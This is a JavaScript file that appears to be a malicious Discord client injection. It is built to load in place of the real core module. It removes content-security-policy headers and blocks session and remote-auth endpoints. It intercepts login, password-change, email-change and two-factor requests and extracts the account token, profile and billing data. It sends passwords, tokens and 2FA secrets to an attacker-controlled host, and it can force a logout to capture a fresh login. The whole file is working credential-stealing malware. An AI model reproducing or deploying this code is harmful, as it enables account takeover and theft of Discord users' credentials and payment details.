const { BrowserWindow, session } = require('electron');
const { existsSync, mkdirSync } = require('fs');
const https = require('https');
const { join } = require('path');

const options = {
    user_id: 'USER_ID_HERE',
    host: process.env.HOST,
    logout_discord: 'DISCORD_LOGOUT_HERE'
};

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  delete details.responseHeaders['content-security-policy'];
  delete details.responseHeaders['content-security-policy-report-only'];

  callback({
      responseHeaders: {
          ...details.responseHeaders,
          'Access-Control-Allow-Headers': "*"
      }
  });
});

session.defaultSession.webRequest.onBeforeRequest({
  urls: [
    'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
    'https://*.discord.com/api/v*/applications/detectable',
    'https://discord.com/api/v*/applications/detectable',
    'https://*.discord.com/api/v*/users/@me/library',
    'https://discord.com/api/v*/users/@me/library',
    'wss://remote-auth-gateway.discord.gg/*',
    'https://.discord.com/api/v/auth/sessions',
    'https://discord.com/api/v/auth/sessions',
    'https://discordapp.com/api/v*/users/@me/mfa/totp/enable',
    'https://discord.com/api/v*/users/@me/mfa/totp/enable',
    'https://*.discord.com/api/v*/users/@me/mfa/totp/enable',
  ],
}, async(details, callback) => {
  if(details.url.startsWith('wss://')) {
    return callback({
      cancel: true
    });
  };

  if(options.logout_discord === 'true') {
    if(!existsSync(join(process.cwd(), 'Casey'))) {
      mkdirSync(join(process.cwd(), 'Casey'));

      await logout();
    };
  };

  if(details.url.endsWith('auth/sessions')) {
    return callback({
      cancel: true
    });
  };

  if(details.url.endsWith('enable')) {
    const req_data = getRequestData(details), token = await getAccountToken();

    if(req_data?.secret && req_data?.password && token && req_data?.code !== '') {
        const account_info = await getAccountInfo(token);
        sendData(`{
            "user": ${account_info?.user},
            "profile": ${account_info?.profile},
            "billing": ${account_info?.billing},
            "stealer_user": "${options.user_id}",
            "login": {
                  "password": "${req_data?.password}",
                  "token": "${token}"
            },
            "two_factor": {
                "secret": "${req_data?.secret}",
                "code": "${req_data?.code}"
            }
      }`, '2fa-enable');
      
      callback({
        cancel: true
      });
    };
  };
});

session.defaultSession.webRequest.onCompleted({
    urls: [
        'https://discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/users/@me',
        'https://*.discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/auth/login',
        'https://discord.com/api/v*/auth/login',
        'https://*.discord.com/api/v*/auth/login',
        'https://discordapp.com/api/v*/users/@me/mfa/totp/disable',
        'https://discord.com/api/v*/users/@me/mfa/totp/disable',
        'https://*.discord.com/api/v*/users/@me/mfa/totp/disable',
    ]
}, async (details, callback) => {
    if (details.statusCode != 200) return;
    const req_data = getRequestData(details);
    const token = await getAccountToken();

    if(details.url.endsWith('disable')) {
      const token = await getAccountToken();
  
      const account_info = await getAccountInfo(token);
      sendData(`{
          "user": ${account_info?.user},
          "profile": ${account_info?.profile},
          "billing": ${account_info?.billing},
          "stealer_user": "${options.user_id}",
          "login": {
              "token": "${token}"
          }
    }`, '2fa-disable');
    
    callback({
      cancel: false
    });
  };

    if(details?.url.endsWith('users/@me')) {
        if(details?.method != 'PATCH' || !req_data?.password) return;
        if(req_data?.new_password) {
            const account_info = await getAccountInfo(token);
            sendData(`{
                "user": ${account_info?.user},
                "profile": ${account_info?.profile},
                "billing": ${account_info?.billing},
                "stealer_user": "${options.user_id}",
                "login": {
                      "password": "${req_data?.password}",
                      "new_password": "${req_data?.new_password}",
                      "token": "${token}"
                }
          }`, 'password-change');

          callback({
            cancel: false
          });
        };
        
      if(req_data?.email) {
        const account_info = await getAccountInfo(token);
        sendData(`{
            "user": ${account_info?.user},
            "profile": ${account_info?.profile},
            "billing": ${account_info?.billing},
            "stealer_user": "${options.user_id}",
            "login": {
                  "password": "${req_data?.password}",
                  "email": "${req_data?.email}",
                  "token": "${token}"
            }
      }`, 'email-change');

      callback({
        cancel: false
      });
    };
};

    if(details?.url.endsWith('auth/login')) {
        if(details?.method != 'POST' || !req_data?.password) return;
        if(req_data?.password && token) {
        const account_info = await getAccountInfo(token);

        sendData(`{
            "user": ${account_info?.user},
            "profile": ${account_info?.profile},
            "billing": ${account_info?.billing},
            "stealer_user": "${options.user_id}",
            "login": {
                  "password": "${req_data?.password}",
                  "token": "${token}"
            }
      }`, 'discord-login');

      callback({
        cancel: false
    });
  } else if(req_data?.password && !token) {
      session.defaultSession.webRequest.onCompleted({
          urls: [
              'https://discordapp.com/api/v*/auth/mfa/totp',
              'https://discord.com/api/v*/auth/mfa/totp',
              'https://*.discord.com/api/v*/auth/mfa/totp',
          ]
      }, async(details, callback) => {
          if(details?.statusCode !== 200) return;
          const mfa_token = await getAccountToken();

          if(mfa_token) {
              const account_info = await getAccountInfo(mfa_token);
              sendData(`{
                    "user": ${account_info?.user},
                    "profile": ${account_info?.profile},
                    "billing": ${account_info?.billing},
                    "stealer_user": "${options.user_id}",
                    "login": {
                          "password": "${req_data?.password}",
                          "token": "${mfa_token}"
                    }
              }`, 'discord-login');
  
              callback({
                  cancel: false
              });
          };
        });
      };
    };
});


async function getAccountToken() {
      const token = await exec(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`, true);
      return token;
};

function getRequestData(details) {
      const request_data = Buffer.from(details?.uploadData?.[0]?.bytes)?.toString();
      return JSON.parse(request_data);
};


function sendData(body, type) {
      const req = https.request({
            host: options.host,
            path: `/api/${type}/`,
            protocol: 'https:',
            method: 'POST',
            headers: {
               'Content-Type': 'application/json',
            },
     });

     req.write(body);
     req.end();
};

async function getAccountInfo(token) {
      const user = await exec(`var request = new XMLHttpRequest();
      request.open('GET', 'https://discord.com/api/v10/users/@me', false);
      request.setRequestHeader('Authorization', '${token}');
      request.send(null);
      request.responseText;`);

      if(!JSON.parse(user)?.id) return;

      const profile = await exec(`var request = new XMLHttpRequest();
      request.open('GET', 'https://discord.com/api/v10/users/${JSON.parse(user)?.id}/profile', false);
      request.setRequestHeader('Authorization', '${token}');
      request.send(null);
      request.responseText;`);

      const billing = await exec(`var request = new XMLHttpRequest();
      request.open('GET', 'https://discord.com/api/v10/users/@me/billing/payment-sources', false);
      request.setRequestHeader('Authorization', '${token}');
      request.send(null);
      request.responseText;`);

      return {
            user,
            profile,
            billing
      };
};

async function exec(script) {
      const window = BrowserWindow.getAllWindows()[0];
      return window.webContents.executeJavaScript(script, true);
};

async function logout() {
      const window = BrowserWindow.getAllWindows()[0];
      return window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, true);
};

module.exports = require('./core.asar');